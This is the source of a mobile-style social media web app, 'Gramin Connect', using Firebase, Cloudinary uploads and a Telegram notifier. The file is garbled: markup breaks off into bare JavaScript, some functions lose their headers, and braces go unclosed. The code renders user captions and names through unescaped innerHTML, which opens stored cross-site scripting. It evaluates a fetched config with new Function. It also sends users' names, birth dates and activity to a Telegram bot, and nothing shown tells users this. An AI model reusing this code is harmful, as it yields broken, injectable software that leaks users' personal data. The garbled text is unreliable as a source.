<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Gramin Social & Media Portal</title>
  
  <!-- Fonts & Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>

  <style>
    :root {
      --bg-dark: #000000;
      --card-bg: #121212;
      --border: #262626;
      --accent: #0095f6;
      --accent-hover: #1877f2;
      --like: #ed4956;
      --text-primary: #f5f5f5;
      --text-secondary: #8e8e8e;
      --online: #31a24c;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Plus Jakarta Sans', sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: var(--bg-dark);
      color: var(--text-primary);
      padding-bottom: 65px;
      overflow-x: hidden;
    }

    /* Top App Header */
    header.top-header {
      position: sticky;
      top: 0;
      z-index: 100;
      background: rgba(0, 0, 0, 0.88);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 16px;
      height: 54px;
    }

    .brand-box {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .back-btn {
      color: var(--text-primary);
      font-size: 1.1rem;
      text-decoration: none;
      display: flex;
      align-items: center;
      padding: 4px;
    }

    .logo-text {
      font-weight: 700;
      font-size: 1.2rem;
      letter-spacing: -0.5px;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .header-icons {
      display: flex;
      align-items: center;
      gap: 18px;
      font-size: 1.3rem;
    }

    .header-icons i {
      cursor: pointer;
      position: relative;
    }

    .badge-dot {
      position: absolute;
      top: -2px;
      right: -2px;
      width: 8px;
      height: 8px;
      background: var(--like);
      border-radius: 50%;
      border: 1.5px solid #000;
    }

    /* Stories Bar */
    .stories-bar {
      display: flex;
      gap: 14px;
      padding: 12px 14px;
      overflow-x: auto;
      border-bottom: 1px solid var(--border);
      scrollbar-width: none;
    }
    .stories-bar::-webkit-scrollbar { display: none; }

    .story-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 66px;
      flex-shrink: 0;
      cursor: pointer;
    }

    .story-avatar-wrap {
      width: 62px;
      height: 62px;
      border-radius: 50%;
      padding: 2px;
      background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .story-avatar-wrap.add-story {
      background: #333;
    }

    .story-avatar-wrap img {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid #000;
    }

    .add-story-icon {
      position: absolute;
      bottom: 0;
      right: 0;
      background: var(--accent);
      color: #fff;
      font-size: 10px;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      border: 2px solid #000;
    }

    .story-user {
      font-size: 0.72rem;
      color: var(--text-secondary);
      margin-top: 5px;
      text-align: center;
      width: 100%;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    /* Feed Layout */
    .content-container {
      max-width: 520px;
      margin: 0 auto;
    }

    .post-card {
      border-bottom: 1px solid var(--border);
      padding-bottom: 12px;
      margin-bottom: 8px;
    }

    .post-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 14px;
    }

    .post-user-meta {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .avatar-sm {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      object-fit: cover;
    }

    .post-username {
      font-weight: 600;
      font-size: 0.9rem;
    }

    .post-media-container {
      width: 100%;
      background: #080808;
      display: flex;
      align-items: center;
      justify-content: center;
      max-height: 520px;
      overflow: hidden;
    }

    .post-media-container img, 
    .post-media-container video {
      width: 100%;
      max-height: 520px;
      object-fit: contain;
    }

    .post-interactions {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 14px 6px;
      font-size: 1.35rem;
    }

    .interactions-left {
      display: flex;
      gap: 16px;
    }

    .post-interactions i {
      cursor: pointer;
    }

    .post-interactions i.liked {
      color: var(--like);
    }

    .post-metrics {
      padding: 0 14px;
      font-size: 0.82rem;
      font-weight: 600;
      color: var(--text-primary);
      display: flex;
      gap: 14px;
      margin-bottom: 6px;
    }

    .post-caption-box {
      padding: 0 14px;
      font-size: 0.88rem;
      line-height: 1.4;
    }

    .post-caption-box strong {
      margin-right: 6px;
    }

    /* Bottom Navigation */
    nav.bottom-nav {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      height: 56px;
      background: #000;
      border-top: 1px solid var(--border);
      display: flex;
      align-items: center;
      justify-content: space-around;
      z-index: 100;
      font-size: 1.3rem;
    }

    .nav-icon {
      color: var(--text-secondary);
      cursor: pointer;
    }

    .nav-icon.active {
      color: var(--text-primary);
    }

    /* Modals & Overlays */
    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.85);
      z-index: 250;
      display: none;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    .modal-backdrop.show {
      display: flex;
    }

    .modal-sheet {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 16px;
      width: 100%;
      max-width: 440px;
      max-height: 92vh;
      overflow-y: auto;
      padding: 22px;
    }

    .modal-head {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
      font-size: 1.1rem;
      font-weight: 700;
    }

    .form-group {
      margin-bottom: 14px;
    }

    .form-group label {
      display: block;
      font-size: 0.8rem;
      color: var(--text-secondary);
      margin-bottom: 6px;
      font-weight: 500;
    }

    .input-field {
      width: 100%;
      background: #1c1c1c;
      border: 1px solid var(--border);
      color: #fff;
      padding: 12px 14px;
      border-radius: 9px;
      font-size: 0.92rem;
      outline: none;
    }

    .input-field:focus {
      border-color: var(--accent);
    }

    .btn-main {
      width: 100%;
      background: var(--accent);
      color: #fff;
      border: none;
      padding: 12px;
      border-radius: 9px;
      font-weight: 600;
      cursor: pointer;
      font-size: 0.95rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .btn-main:active {
      background: var(--accent-hover);
    }

    .btn-google {
      width: 100%;
      background: #ffffff;
      color: #000;
      border: none;
      padding: 11px;
      border-radius: 9px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-top: 12px;
      font-size: 0.92rem;
    }
    /* Profile View */
    .profile-view {
      display: none;
      padding: 16px;
    }

    .profile-header {
      display: flex;
      align-items: center;
      gap: 22px;
      margin-bottom: 16px;
    }

    .profile-avatar-wrap {
      position: relative;
      width: 82px;
      height: 82px;
      cursor: pointer;
    }

    .profile-avatar-large {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid var(--border);
    }

    .avatar-edit-badge {
      position: absolute;
      bottom: 0;
      right: 0;
      background: var(--accent);
      width: 24px;
      height: 24px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      color: #fff;
      border: 2px solid #000;
    }

    .profile-stats-group {
      display: flex;
      gap: 24px;
      text-align: center;
    }

    .stat-number {
      font-weight: 700;
      font-size: 1.05rem;
    }

    .stat-label {
      font-size: 0.75rem;
      color: var(--text-secondary);
    }

    .profile-info {
      margin-bottom: 16px;
    }

    .profile-display-name {
      font-weight: 700;
      font-size: 0.95rem;
    }

    .profile-display-handle {
      color: var(--text-secondary);
      font-size: 0.85rem;
      margin-bottom: 4px;
    }

    .profile-bio-text {
      font-size: 0.88rem;
      line-height: 1.4;
    }

    .profile-actions {
      display: flex;
      gap: 10px;
    }

    .btn-secondary {
      flex: 1;
      background: #242424;
      color: var(--text-primary);
      border: 1px solid var(--border);
      padding: 9px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 0.85rem;
      cursor: pointer;
    }

    .profile-grid-feed {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 3px;
      margin-top: 18px;
    }

    .grid-feed-item {
      aspect-ratio: 1;
      background: #181818;
      position: relative;
    }

    .grid-feed-item img, 
    .grid-feed-item video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    /* Chat View */
    .chat-view {
      display: none;
      height: calc(100vh - 120px);
      flex-direction: column;
    }

    .active-users-bar {
      display: flex;
      gap: 12px;
      padding: 10px 14px;
      border-bottom: 1px solid var(--border);
      overflow-x: auto;
      scrollbar-width: none;
    }

    .active-user-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      position: relative;
      flex-shrink: 0;
    }

    .active-avatar-wrap {
      width: 46px;
      height: 46px;
      position: relative;
    }

    .active-avatar-wrap img {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      object-fit: cover;
    }

    .online-indicator {
      width: 11px;
      height: 11px;
      background: var(--online);
      border-radius: 50%;
      position: absolute;
      bottom: 1px;
      right: 1px;
      border: 2px solid #000;
    }

    .chat-inbox-list {
      flex: 1;
      overflow-y: auto;
      padding: 10px 14px;
    }

    .chat-bubble-msg {
      max-width: 75%;
      padding: 10px 14px;
      border-radius: 18px;
      font-size: 0.88rem;
      margin-bottom: 8px;
      word-break: break-word;
    }

    .chat-bubble-msg.outgoing {
      background: var(--accent);
      color: #fff;
      align-self: flex-end;
      margin-left: auto;
    }

    .chat-bubble-msg.incoming {
      background: #242424;
      color: #fff;
      align-self: flex-start;
      margin-right: auto;
    }

    .chat-send-bar {
      display: flex;
      gap: 8px;
      padding: 10px 14px;
      border-top: 1px solid var(--border);
    }

    /* Comments Drawer */
    .comments-drawer {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.7);
      z-index: 300;
      display: none;
      align-items: flex-end;
    }

    .comments-drawer.show {
      display: flex;
    }

    .drawer-content {
      background: var(--card-bg);
      border-top: 1px solid var(--border);
      border-radius: 16px 16px 0 0;
      width: 100%;
      max-height: 70vh;
      display: flex;
      flex-direction: column;
      padding: 16px;
    }

    .drawer-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 12px;
      border-bottom: 1px solid var(--border);
    }

    .comments-list-box {
      flex: 1;
      overflow-y: auto;
      padding: 14px 0;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .comment-unit {
      font-size: 0.85rem;
      line-height: 1.35;
    }

    .comment-unit strong {
      margin-right: 6px;
    }

    /* Upload Progress Indicator */
    .upload-progress-box {
      display: none;
      margin-top: 10px;
    }

    .progress-track {
      background: #282828;
      border-radius: 4px;
      height: 6px;
      overflow: hidden;
    }

    .progress-fill {
      background: var(--accent);
      height: 100%;
      width: 0%;
      transition: width 0.2s ease;
    }
  </style>
</head>
<body>

  <!-- Top Header Navigation -->
  <header class="top-header">
    <div class="brand-box">
      <!-- Direct Back to Portal -->
      <a href="index.html" class="back-btn" title="Back to Main Portal">
        <i class="fa-solid fa-arrow-left"></i>
      </a>
      <span class="logo-text">Gramin Connect</span>
    </div>
    <div class="header-icons">
      <i class="fa-regular fa-heart" onclick="switchMainTab('notifications')"></i>
      <i class="fa-brands fa-facebook-messenger" onclick="switchMainTab('chat')">
        <span class="badge-dot" id="chatBadge" style="display:none;"></span>
      </i>
    </div>
  </header>

  <!-- Stories Bar -->
  <div class="stories-bar" id="storiesBar">
    <!-- Story Upload Action -->
    <div class="story-item" onclick="triggerStoryUpload()">
      <div class="story-avatar-wrap add-story">
        <img id="myStoryAvatar" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&auto=format&fit=crop&q=80" alt="You">
        <div class="add-story-icon"><i class="fa-solid fa-plus"></i></div>
      </div>
      <span class="story-user">Your Story</span>
    </div>
    <div id="activeStoriesTray" style="display: flex; gap: 14px;"></div>
  </div>

  <!-- Feed Section -->
  <main class="content-container" id="feedSection">
    <div id="postsFeedContainer"></div>
  </main>

  <!-- Search Section -->
  <section class="content-container" id="searchSection" style="display: none; padding: 14px;">
    <input type="text" id="mainSearchInput" class="input-field" placeholder="Search people, tags or captions..." oninput="filterMediaSearch(this.value)">
    <div id="searchListResults" style="margin-top: 14px; display: flex; flex-direction: column; gap: 10px;"></div>
  </section>

  <!-- Direct Messages / Chat Section -->
  <section class="content-container chat-view" id="chatSection">
    <!-- Active Online Users -->
    <div class="active-users-bar" id="activeUsersTray"></div>
    <div class="chat-inbox-list" id="chatMessagesContainer"></div>
    <div class="chat-send-bar">
      <input type="text" id="chatInputMessage" class="input-field" placeholder="Send a message...">
      <button class="btn-main" style="width: auto; padding: 0 18px;" onclick="sendChatMessage()">
        <i class="fa-solid fa-paper-plane"></i>
      </button>
    </div>
  </section>

  <!-- Notifications Section -->
  <section class="content-container" id="notifSection" style="display: none; padding: 16px;">
    <h3 style="font-size: 1.1rem; margin-bottom: 14px;">Notifications</h3>
    <div id="notificationsListBox" style="display: flex; flex-direction: column; gap: 12px;"></div>
  </section>

  <!-- My Profile Section -->
  <section class="content-container profile-view" id="profileSection">
    <div class="profile-header">
      <div class="profile-avatar-wrap" onclick="triggerProfilePhotoPicker()">
        <img id="profileUserImg" class="profile-avatar-large" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80" alt="Avatar">
        <div class="avatar-edit-badge"><i class="fa-solid fa-camera"></i></div>
      </div>
      <div class="profile-stats-group">
        <div>
          <div class="stat-number" id="userPostsCount">0</div>
          <div class="stat-label">Posts</div>
        </div>
        <div>
          <div class="stat-number" id="userFollowersCount">128</div>
          <div class="stat-label">Followers</div>
        </div>
        <div>
          <div class="stat-number" id="userFollowingCount">64</div>
          <div class="stat-label">Following</div>
        </div>
      </div>
    </div>

    <div class="profile-info">
      <div class="profile-display-name" id="userFullnameLabel">Citizen User</div>
      <div class="profile-display-handle" id="userHandleLabel">@user_abc</div>
      <div class="profile-bio-text" id="userBioLabel">Digital Panchayat member. Exploring village events.</div>
    </div>

    <div class="profile-actions">
      <button class="btn-secondary" onclick="openProfileEditModal()">Edit Profile</button>
      <button class="btn-secondary" style="color: var(--like);" onclick="handleUserLogout()">Logout</button>
    </div>

    <div class="profile-grid-feed" id="userGridPostsContainer"></div>
  </section>

  <!-- Bottom App Navigation Bar -->
  <nav class="bottom-nav">
    <i class="fa-solid fa-house nav-icon active" id="navItemHome" onclick="switchMainTab('feed')"></i>
    <i class="fa-solid fa-magnifying-glass nav-icon" id="navItemSearch" onclick="switchMainTab('search')"></i>
    <i class="fa-regular fa-square-plus nav-icon" onclick="triggerPostFilePicker()"></i>
    <i class="fa-solid fa-user nav-icon" id="navItemProfile" onclick="switchMainTab('profile')"></i>
  </nav>

  <!-- Hidden Native File Inputs (Direct Phone Picker Trigger) -->
  <input type="file" id="hiddenPostFileInput" accept="image/*,video/*" style="display:none;" onchange="onPostFileSelected(this)">
  <input type="file" id="hiddenStoryFileInput" accept="image/*,video/*" style="display:none;" onchange="onStoryFileSelected(this)">
  <input type="file" id="hiddenAvatarFileInput" accept="image/*" style="display:none;" onchange="onAvatarFileSelected(this)">

  <!-- MODALS -->

  <!-- 1. Post Preview & Caption Modal -->
  <div class="modal-backdrop" id="postCreateModal">
    <div class="modal-sheet">
      <div class="modal-head">
        <span>New Post</span>
        <i class="fa-solid fa-xmark" style="cursor: pointer;" onclick="closeModal('postCreateModal')"></i>
      </div>
      <div id="postPreviewContainer" style="width: 100%; max-height: 250px; background: #000; border-radius: 8px; overflow: hidden; margin-bottom: 12px; display: flex; align-items: center; justify-content: center;"></div>
      <div class="form-group">
        <label>Caption / Description</label>
        <textarea id="newPostCaption" class="input-field" rows="3" placeholder="Write something about this post..."></textarea>
      </div>
      <div class="upload-progress-box" id="postUploadProgressBox">
        <div class="progress-track"><div class="progress-fill" id="postProgressBar"></div></div>
        <div style="font-size: 0.75rem; color: var(--text-secondary); text-align: right; margin-top: 4px;" id="postProgressPercent">0%</div>
      </div>
      <button class="btn-main" id="btnSubmitPost" onclick="executePostUpload()">Share Post</button>
    </div>
  </div>

  <!-- 2. Auth Modal (Register / Login) -->
  <div class="modal-backdrop" id="authGatewayModal">
    <div class="modal-sheet">
      <div class="modal-head">
        <span id="authHeaderTitle">Join Community</span>
      </div>

      <div style="display: flex; gap: 8px; margin-bottom: 16px;">
        <button id="tabRegisterBtn" class="btn-main" style="margin: 0; padding: 8px;" onclick="setAuthTab('register')">Create Account</button>
        <button id="tabLoginBtn" class="btn-main" style="margin: 0; padding: 8px; background: #242424;" onclick="setAuthTab('login')">Sign In</button>
      </div>

      <!-- Registration Form -->
      <div id="registerFormFields">
        <div class="form-group">
          <label>Full Name *</label>
          <input type="text" id="regFullName" class="input-field" placeholder="e.g. Alex Smith">
        </div>
        <div class="form-group">
          <label>User ID (Unique) *</label>
          <input type="text" id="regUserId" class="input-field" placeholder="e.g. abc_user">
        </div>
        <div class="form-group">
          <label>Date of Birth *</label>
          <input type="date" id="regDob" class="input-field">
        </div>
        <div class="form-group">
          <label>Short Bio</label>
          <input type="text" id="regBio" class="input-field" placeholder="Tell something about yourself...">
        </div>
      </div>

      <!-- Login Form Fields -->
      <div id="loginFormFields" style="display: none;">
        <div class="form-group">
          <label>User ID *</label>
          <input type="text" id="loginUserId" class="input-field" placeholder="Enter your User ID">
        </div>
      </div>

      <!-- Password Field -->
      <div class="form-group">
        <label>Password *</label>
        <input type="password" id="authPass" class="input-field" placeholder="Minimum 6 characters">
      </div>

      <button class="btn-main" id="authSubmitActionBtn" onclick="processAuthSubmit()">Continue</button>

      <div style="text-align: center; margin: 12px 0; color: var(--text-secondary); font-size: 0.8rem;">OR</div>

      <button class="btn-google" onclick="triggerGoogleAuthentication()">
        <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" width="18" alt="Google">
        Continue with Google
      </button>
    </div>
  </div>

  <!-- 3. Edit Profile Modal -->
  <div class="modal-backdrop" id="editProfileDialog">
    <div class="modal-sheet">

    // --- 3. DYNAMIC FIREBASE INITIALIZER ---
    async function bootFirebase() {
      try {
        const response = await fetch("index.html");
        if (response.ok) {
          const content = await response.text();
          const extractedConfig = content.match(/firebaseConfig\s*=\s*({[\s\S]*?});/);
          if (extractedConfig && extractedConfig[1]) {
            firebaseConfig = (new Function("return " + extractedConfig[1]))();
          }
        }
      } catch (err) {
        console.log("Auto-fetch fallback used.");
      }

      if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
      }
      auth = firebase.auth();
      db = firebase.firestore();

      listenAuthStatus();
    }

    bootFirebase();

    // --- 4. TELEGRAM NOTIFIER HELPER ---

      const apiEndpoint = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
      fetch(apiEndpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CONFIG.chatId,
          text: `[Portal Notification]\n${eventMessage}`

      }).catch(err => console.warn("Telegram ping failed", err));

    // --- 5. AUTHENTICATION LIFECYCLE ---
    function listenAuthStatus() {
      auth.onAuthStateChanged(async (user) => {
        if (user) {
          const userDoc = await db.collection("users").doc(user.uid).get();
          if (userDoc.exists) {
            currentUser = { uid: user.uid, ...userDoc.data() };
            completeLoginSuccess();
          } else {
            // Google user first sign in
            const defaultUid = "user_" + user.uid.substring(0, 5);
            currentUser = {
              uid: user.uid,
              fullName: user.displayName || "Portal Citizen",
              username: defaultUid,
              dob: "",
              bio: "Member of Gramin Portal.",
              avatar: user.photoURL || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80",
              followers: [],
              following: []
            };
            await db.collection("users").doc(user.uid).set(currentUser);
            sendTelegramAlert(`New User via Google: ${currentUser.fullName} (@${currentUser.username})`);
            completeLoginSuccess();
          }
        } else {
          document.getElementById("authGatewayModal").classList.add("show");
        }
      });
    }

      if (mode === "register") {

        regTab.style.background = "var(--accent)";

        regForm.style.display = "none";

        loginTab.style.background = "var(--accent)";
        regTab.style.background = "#242424";
        title.innerText = "Sign In to Account";
      }

    async function processAuthSubmit() {
      const pass = document.getElementById("authPass").value.trim();
      if (!pass || pass.length < 6) {
        alert("Password must be at least 6 characters!");
        return;
      }

      if (currentAuthMode === "register") {
        const fullName = document.getElementById("regFullName").value.trim();
        const username = document.getElementById("regUserId").value.trim().toLowerCase();
        const dob = document.getElementById("regDob").value;
        const bio = document.getElementById("regBio").value.trim() || "Village community member.";

        if (!fullName || !username || !dob) {
          alert("Please fill all required fields!");
          return;
        }

        // Check if username already exists
        const existsCheck = await db.collection("users").where("username", "==", username).get();
        if (!existsCheck.empty) {
          alert("already exists");
          return;
        }

        const internalEmail = `${username}@portal.local`;
        try {
          const creds = await auth.createUserWithEmailAndPassword(internalEmail, pass);
          const userData = {
            fullName,
            username,
            dob,
            bio,
            avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80",
            followers: [],
            following: [],
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
          };
          await db.collection("users").doc(creds.user.uid).set(userData);
          currentUser = { uid: creds.user.uid, ...userData };
          sendTelegramAlert(`New Account Registered: ${fullName} (@${username}), DOB: ${dob}`);
          completeLoginSuccess();
        } catch (err) {
          if (err.code === "auth/email-already-in-use") {
            alert("already exists");
          } else {
            alert("Error: " + err.message);
          }
        }
      } else {
        const username = document.getElementById("loginUserId").value.trim().toLowerCase();
        if (!username) {
          alert("Please enter your User ID!");
          return;
        }
        const internalEmail = `${username}@portal.local`;
        try {
          await auth.signInWithEmailAndPassword(internalEmail, pass);
          completeLoginSuccess();
        } catch (err) {
          alert("Invalid User ID or Password!");
        }
      }
    }

    // --- 6. CLOUDINARY UPLOADER ---
    async function executeCloudinaryUpload(file, progressCallback) {
      const endpoint = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/auto/upload`;
      const formData = new FormData();
      formData.append("file", file);
      formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);

      return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", endpoint, true);
        xhr.upload.onprogress = (e) => {
          if (e.lengthComputable && progressCallback) {
            progressCallback(Math.round((e.loaded / e.total) * 100));
          }
        };
        xhr.onload = () => {
          if (xhr.status === 200) {
            const data = JSON.parse(xhr.responseText);
            resolve(data.secure_url);
          } else {
            reject("Cloudinary upload failed: " + xhr.status);
          }
        };
        xhr.onerror = () => reject("Network error during file transfer.");
        xhr.send(formData);
      });
    }

    // --- 7. POST CREATION & NATIVE PICKER ---
    function triggerPostFilePicker() {
      document.getElementById("hiddenPostFileInput").click();

    function onPostFileSelected(input) {
      if (input.files && input.files[0]) {
        selectedPostFile = input.files[0];
        const previewContainer = document.getElementById("postPreviewContainer");
        previewContainer.innerHTML = "";

        const isVideo = selectedPostFile.type.startsWith("video/");
        const fileUrl = URL.createObjectURL(selectedPostFile);

        if (isVideo) {
          const video = document.createElement("video");
          video.src = fileUrl;
          video.controls = true;
          video.style.maxWidth = "100%";
          video.style.maxHeight = "250px";
          previewContainer.appendChild(video);
        } else {
          const img = document.createElement("img");
          img.src = fileUrl;
          img.style.maxWidth = "100%";
          img.style.maxHeight = "250px";
          img.style.objectFit = "contain";
          previewContainer.appendChild(img);
        }

        document.getElementById("postCreateModal").classList.add("show");
      }
    }

    async function executePostUpload() {
      if (!selectedPostFile) return;

      const caption = document.getElementById("newPostCaption").value.trim();
      const progressBox = document.getElementById("postUploadProgressBox");
      const progressBar = document.getElementById("postProgressBar");
      const progressText = document.getElementById("postProgressPercent");
      const submitBtn = document.getElementById("btnSubmitPost");

      try {
        submitBtn.disabled = true;
        progressBox.style.display = "block";

        const mediaUrl = await executeCloudinaryUpload(selectedPostFile, (percent) => {
          progressBar.style.width = percent + "%";
          progressText.innerText = percent + "%";
        });

        const isVideo = selectedPostFile.type.startsWith("video/");
        await db.collection("posts").add({
          authorId: currentUser.uid,
          authorName: currentUser.fullName,
          authorUsername: currentUser.username,
          authorAvatar: currentUser.avatar,
          mediaUrl: mediaUrl,
          mediaType: isVideo ? "video" : "image",
          caption: caption,
          likes: [],
          views: 1,
          createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });

        sendTelegramAlert(`New Post uploaded by @${currentUser.username}: "${caption}"\nURL: ${mediaUrl}`);

        closeModal("postCreateModal");
        selectedPostFile = null;
        document.getElementById("hiddenPostFileInput").value = "";
        document.getElementById("newPostCaption").value = "";
        progressBox.style.display = "none";
        loadUserGridPosts();
      } catch (err) {
        alert("Upload error: " + err);
      } finally {
        submitBtn.disabled = false;
      }
    }

    // --- 8. FEED & INTERACTIONS ---
    function initFeedSubscription() {
      db.collection("posts").orderBy("createdAt", "desc").onSnapshot((snapshot) => {
        const feedWrapper = document.getElementById("postsFeedContainer");
        feedWrapper.innerHTML = "";

        const allPosts = [];
        snapshot.forEach(doc => allPosts.push({ id: doc.id, ...doc.data() }));

        // Combine live posts with sample posts if list is small
        const renderList = allPosts.length > 0 ? allPosts : INITIAL_SAMPLE_POSTS;

        renderList.forEach(post => {
          const isLiked = post.likes && post.likes.includes(currentUser.uid);
          const postCard = document.createElement("div");
          postCard.className = "post-card";
          postCard.innerHTML = `
            <div class="post-header">
              <div class="post-user-meta">
                <img src="${post.authorAvatar}" class="avatar-sm" alt="Author">
                <span class="post-username">${post.authorUsername}</span>
              </div>
              <i class="fa-solid fa-ellipsis" style="color: var(--text-secondary); cursor: pointer;"></i>
            </div>
            <div class="post-media-container">
              ${post.mediaType === "video" 
                ? `<video src="${post.mediaUrl}" controls playsinline></video>` 
                : `<img src="${post.mediaUrl}" loading="lazy" alt="Post">`}
            </div>
            <div class="post-interactions">
              <div class="interactions-left">
                <i class="fa-${isLiked ? 'solid' : 'regular'} fa-heart ${isLiked ? 'liked' : ''}" onclick="togglePostLike('${post.id}')"></i>
                <i class="fa-regular fa-comment" onclick="openCommentsDrawer('${post.id}')"></i>
                <i class="fa-regular fa-paper-plane" onclick="sharePostItem('${post.id}')"></i>
              </div>
              <i class="fa-regular fa-bookmark"></i>
            </div>
            <div class="post-metrics">
              <span>${(post.likes || []).length} likes</span>
              <span>${post.views || 1} views</span>
            </div>
            <div class="post-caption-box">
              <strong>${post.authorUsername}</strong>${post.caption || ""}
            </div>
          `;
          feedWrapper.appendChild(postCard);
        });
      });
    }

    async function togglePostLike(postId) {
      if (postId.startsWith("sample_")) return; // ignore sample posts
      const postRef = db.collection("posts").doc(postId);
      const postDoc = await postRef.get();
      if (!postDoc.exists) return;

      const postData = postDoc.data();
      const currentLikes = postData.likes || [];
      const uid = currentUser.uid;

      if (currentLikes.includes(uid)) {
        await postRef.update({ likes: firebase.firestore.FieldValue.arrayRemove(uid) });
      } else {
        await postRef.update({ likes: firebase.firestore.FieldValue.arrayUnion(uid) });
        if (postData.authorId !== uid) {
          db.collection("notifications").add({
            receiverId: postData.authorId,
            text: `@${currentUser.username} liked your post.`,
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
          });
          sendTelegramAlert(`@${currentUser.username} liked a post by @${postData.authorUsername}`);
        }
      }
    }

    function sharePostItem(postId) {
      const shareUrl = window.location.href.split('#')[0] + "#post=" + postId;
      if (navigator.share) {
        navigator.share({ title: "Gramin Media Post", url: shareUrl });
      } else {
        navigator.clipboard.writeText(shareUrl);
        alert("Link copied to clipboard!");
      }
    }

      db.collection("stories").orderBy("createdAt", "desc").onSnapshot(snap => {
        const tray = document.getElementById("activeStoriesTray");

        snap.forEach(doc => {
          const s = doc.data();
          const item = document.createElement("div");
          item.className = "story-item";
          item.innerHTML = `
            <div class="story-avatar-wrap" onclick="viewStoryDetail('${s.mediaUrl}', '${s.authorUsername}', '${doc.id}', '${s.userId}')">
              <img src="${s.authorAvatar}" alt="Story">
            </div>
            <span class="story-user">${s.authorUsername}</span>
          `;
          tray.appendChild(item);
        });
      });

    function viewStoryDetail(url, username, storyId, ownerId) {
      const isOwner = ownerId === currentUser.uid;
      const action = prompt(`Story by @${username}\nType 'R' for Heart Reaction (❤️)\nType 'D' to Delete Story (Owner only)`);
      if (action && action.toUpperCase() === 'D' && isOwner) {
        db.collection("stories").doc(storyId).delete();
        alert("Story deleted.");
      } else if (action && action.toUpperCase() === 'R') {
        alert("Reaction sent: ❤️");
        sendTelegramAlert(`@${currentUser.username} reacted ❤️ to @${username}'s story`);
      }
    }

    function initChatSubscription() {
      // Active users list
      const activeTray = document.getElementById("activeUsersTray");
      activeTray.innerHTML = `
        <div class="active-user-item">
          <div class="active-avatar-wrap">
            <img src="${currentUser ? currentUser.avatar : ''}">
            <span class="online-indicator"></span>
          </div>
          <span style="font-size:0.7rem; color:var(--text-secondary);">You</span>
        </div>
      `;

      // Messages sync
      db.collection("messages").orderBy("createdAt", "asc").limitToLast(40).onSnapshot(snap => {
        const container = document.getElementById("chatMessagesContainer");
        container.innerHTML = "";

        snap.forEach(doc => {
          const msg = doc.data();
          const isMine = msg.senderId === currentUser.uid;
          const bubble = document.createElement("div");
          bubble.className = `chat-bubble-msg ${isMine ? 'outgoing' : 'incoming'}`;
          bubble.innerText = `${isMine ? '' : '@' + msg.senderUsername + ': '}${msg.text}`;
          container.appendChild(bubble);
        });
        container.scrollTop = container.scrollHeight;
      });
    }

    async function sendChatMessage() {
      const input = document.getElementById("chatInputMessage");
